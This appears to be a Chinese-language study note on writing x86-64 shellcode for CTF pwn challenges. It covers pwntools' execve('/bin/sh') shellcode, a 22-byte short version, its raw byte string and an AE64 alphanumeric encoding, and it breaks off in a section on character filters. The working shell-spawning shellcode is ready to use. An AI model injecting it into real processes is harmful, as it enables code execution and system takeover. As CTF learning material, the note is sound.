# shellcode

其实想要做的是代码注入总结篇

## 基础shellcode的书写

要做shellcode，认为有下面几点要解决：

- 一般情况下需要相应内存块至少有可执行权限，如果没有的话看看有没有`mprotect`函数，可以进行一个权限申请
- 需要知道写入地址，或者让寄存器指向写入的代码块

### 直接pwntools生成

```assembly
    /* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push b'/bin///sh\x00' */
    push 0x68
    mov rax, 0x732f2f2f6e69622f
    push rax
    mov rdi, rsp
    /* push argument array ['sh\x00'] */
    /* push b'sh\x00' */
    push 0x1010101 ^ 0x6873
    xor dword ptr [rsp], 0x1010101
    xor esi, esi /* 0 */
    push rsi /* null terminate */
    push 8
    pop rsi
    add rsi, rsp
    push rsi /* 'sh\x00' */
    mov rsi, rsp
    xor edx, edx /* 0 */
    /* call execve() */
    push SYS_execve /* 0x3b */
    pop rax
    syscall
```

这里将`/bin/sh`直接压入栈中，然后利用rsp的偏移获取地址，直接生成`shellcraft.sh()`生成即可，不做过多介绍

### 限制长度的shellcode（x86)

```assembly
xor rsi,rsi
push rsi
mov rdi, 0x68732f2f6e69622f
push rdi
push rsp
pop	 rdi
mov  al, 59
cdq
syscall
```

总长度为22（0x16)字节，实现的是`execve('/bin/sh','sh',0)`，构造出来的条件是这样的：

- rax:0x3b
- rdi:’/bin/sh’
- rsi:’sh’
- rdx:NULL

但是注意，需要eax的高二位为0(一般没什么问题)

bytes形式：

```assembly
\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05
```

可见字符形式(AE64生成)：

*关于ae64,直接看[这里](https://github.com/veritas501/ae64)就可以*

```assembly
WTYH39Yj3TYfi9WmWZj8TYfi9JBWAXjKTYfi9kCWAYjCTYfi93iWAZjrTYfi9h10t830T840T880T890t8A0T8B0T8CRAPZ0t80ZjBTYfi9O60t810T82RAPZ0T80ZH1vVHwzbinzzshWToxnQZP
```

**当然，出题人可能会通过一定的构造来要求更小字节的shellcode，主要就是对栈的理解（其实就是考察汇编功底）**

> 例如tgctf2025的shellcode：
>
> 



### 字符限制shellcode

一般会出现过滤

